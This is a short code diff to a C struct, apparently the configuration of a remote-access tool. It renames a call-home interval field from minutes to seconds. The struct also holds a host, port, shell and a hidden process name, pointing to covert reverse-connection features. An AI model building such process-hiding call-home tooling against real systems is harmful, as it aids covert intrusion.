@@ -7,7 +7,7 @@ struct gsnc_config {
     char host[128];
     char proc_hiddenname[64];
     uint16_t port;
-    int callhome_min;
+    int callhome_sec;
     uint32_t flags;
     char sec_str[64];
     char shell[64];
